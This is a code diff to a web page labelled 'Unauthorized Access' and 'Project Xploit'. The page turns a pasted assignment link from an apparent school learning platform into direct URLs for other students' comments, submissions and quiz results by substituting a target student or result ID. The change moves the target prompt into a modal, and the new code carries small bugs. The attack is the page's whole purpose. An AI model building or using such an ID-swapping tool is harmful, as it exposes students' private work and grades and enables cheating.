@@ -51,6 +51,8 @@ function http_digest_parse($txt)
 
 ?>
 <!DOCTYPE html>
+    <!-- CREDITS TO THE INTERNET!! -->
+    <!-- Project Xploit by DAN -->
 <html lang="en">
   <head>
     <meta charset="utf-8">
@@ -59,6 +61,8 @@ function http_digest_parse($txt)
     <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
     <title>Unauthorized Access</title>
 
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <!-- Bootstrap -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
@@ -127,6 +131,42 @@ function http_digest_parse($txt)
   </head>
   <body>
 
+
+<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title" id="exampleModalLabel">Target URI:</h5>
+
+        </button>
+      </div>
+      <div class="modal-body">
+        <form>
+          <div class="form-group">
+            <label for="message-text" class="col-form-label">https://sample.com/user/show/123</label>
+            <textarea class="form-control" id="target-text"></textarea>
+          </div>
+        </form>
+      </div>
+      <div class="modal-footer">
+        <button type="button" id="cclose" class="btn btn-secondary" data-dismiss="modal">Close</button>
+        <button type="button" class="btn btn-primary" style="background-color:black; border-color:white;color:white;" onclick=atis()>Generate</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+$('#exampleModal').on('show.bs.modal', function (event) {
+  var button = $(event.relatedTarget) // Button that triggered the modal
+  var recipient = button.data('whatever') // Extract info from data-* attributes
+  // If necessary, you could initiate an AJAX request here (and then do the updating in a callback).
+  // Update the modal's content. We'll use jQuery here, but you could use a data binding library or other methods instead.
+  var modal = $(this)
+  modal.find('.modal-title').text('Target URI')
+  modal.find('.modal-body input').val(recipient)
+})
+</script>
 <center>
   <br>
   <br>
@@ -134,7 +174,7 @@ function http_digest_parse($txt)
   <br>
   <iframe width="320" height="280" src="https://www.youtube.com/embed/-rokG9XS37w" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
   <br>
-  <code>"from Knowledge sea power."</code>
+  <code>"Knowledge seas power."</code>
   <br>
   <br>
   <br>
@@ -142,7 +182,7 @@ function http_digest_parse($txt)
       <div class="d-flex justify-content-center h-100">
         <div class="searchbar">
           <input class="search_input" type="text" id="url" placeholder="Paste Target URI">
-          <a type=Submit class="search_icon" onclick=Pota()><i class="fas fa-search"></i></a>
+          <a type=Submit id="subm" class="search_icon" onclick=Pota()><i class="fas fa-search"></i></a>
           <br><br>
           <p id="error-message" style="color:red"><b></b></p>
         </div>
@@ -155,13 +195,6 @@ function http_digest_parse($txt)
 
     <script>
 
-var delay = ( function() {
-    var timer = 0;
-    return function(callback, ms) {
-        clearTimeout (timer);
-        timer = setTimeout(callback, ms);
-    };
-})();  
       
 function Pota(){
   x = document.getElementById('url').value;
@@ -173,27 +206,29 @@ function Pota(){
     
 
         if(x.includes("freeform")){
-          target = prompt("Enter Target URL: ");
-              if(target === ""){
-                document.getElementById('error-message').style.color = "white";
-                document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
-                window.open("https://"+domain+"/student_freeform_assignment/comments_given/"+act, '_blank');
-              }else{
-                document.getElementById('error-message').style.color = "white";
-                document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
-                window.open("https://"+domain+"/student_freeform_assignment/leave_comment/"+act+"?student="+target.replace(/[^0-9]/g, ''), '_blank');
-              }
+
+          var attr = document.createAttribute('data-toggle');
+          attr.value="modal";
+          document.getElementById("subm").setAttributeNode(attr);
+
+          var attr1 = document.createAttribute('data-target');
+          attr1.value="#exampleModal";
+          document.getElementById("subm").setAttributeNode(attr1);
+  
+          
+             
         }else if(x.includes("dropbox")){
-          target = prompt("Enter Target URL: ");
-          if(target === ""){
-            document.getElementById('error-message').style.color = "white";
-            document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
-            window.open("https://"+domain+"/student_dropbox_assignment/comments_given/"+act, '_blank');
-              }else{
-                document.getElementById('error-message').style.color = "white";
-                document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
-                window.open("https://"+domain+"/student_dropbox_assignment/leave_comment/"+act+"?student="+target.replace(/[^0-9]/g, ''), '_blank');
-              }
+          
+          
+          var attr = document.createAttribute('data-toggle');
+          attr.value="modal";
+          document.getElementById("subm").setAttributeNode(attr);
+
+          var attr1 = document.createAttribute('data-target');
+          attr1.value="#exampleModal";
+          document.getElementById("subm").setAttributeNode(attr1);
+
+        
           }else if(x.includes("quiz")){
             //result_id
             quiz = new URL(x);
@@ -206,12 +241,71 @@ function Pota(){
               document.getElementById('error-message').innerHTML = "visit /tutorial for more details.";
             }else{
 
-          document.getElementById('error-message').innerHTML = "invalid activity.";
+          document.getElementById('error-message').innerHTML = "activity not found.";
+          document.getElementById("cclose").click();
           }
         
 
    }catch(error){
     document.getElementById('error-message').innerHTML = "invalid url.";
+    document.getElementById("cclose").click();
+   }
+  }
+
+  function atis(){
+    xx = document.getElementById('url').value;
+    y = document.getElementById('target-text').value;
+   try{
+      
+      const domain = (new URL(xx)).hostname.replace('www.','');
+      const segments = new URL(xx).pathname.split('/');
+      const act = segments.pop() || segments.pop();
+    
+
+        if(xx.includes("freeform")){
+          
+              if(document.getElementById('target-text').value === ""){
+                document.getElementById('error-message').style.color = "white";
+                document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
+                window.open("https://"+domain+"/student_freeform_assignment/comments_given/"+act, '_blank');
+              }else{
+                document.getElementById('error-message').style.color = "white";
+                document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
+                window.open("https://"+domain+"/student_freeform_assignment/leave_comment/"+act+"?student="+y.replace(/[^0-9]/g, ''), '_blank');
+              }
+        }else if(xx.includes("dropbox")){
+          
+
+          if(document.getElementById('taget-text').value == ""){
+            document.getElementById('error-message').style.color = "white";
+            document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
+            window.open("https://"+domain+"/student_dropbox_assignment/comments_given/"+act, '_blank');
+              }else{
+                document.getElementById('error-message').style.color = "white";
+                document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
+                window.open("https://"+domain+"/student_dropbox_assignment/leave_comment/"+act+"?student="+y.replace(/[^0-9]/g, ''), '_blank');
+              }
+          }else if(x.includes("quiz")){
+            //result_id
+            quiz = new URL(xx);
+            var result = quiz.searchParams.get("results");
+             document.getElementById('error-message').style.color = "white";
+             document.getElementById('error-message').innerHTML = "NOTE: Allow pop-ups from this site.";
+              window.open("https://"+domain+"/student_quiz_assignment/submission/"+act+"?results="+result, '_blank');
+            
+            }else if(x.includes("student_lesson")){
+              document.getElementById('error-message').innerHTML = "visit /tutorial for more details.";
+            }else{
+
+          document.getElementById('error-message').innerHTML = "activity not found.";
+          document.getElementById("cclose").click();
+          }
+        
+
+   }catch(error){
+        document.getElementById('error-message').innerHTML = "invalid url.";
+        document.getElementById("cclose").click();
+
    }
   }
   
@@ -220,7 +314,6 @@ function Pota(){
 
     <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
     <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
-<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
   </body>
 </html>
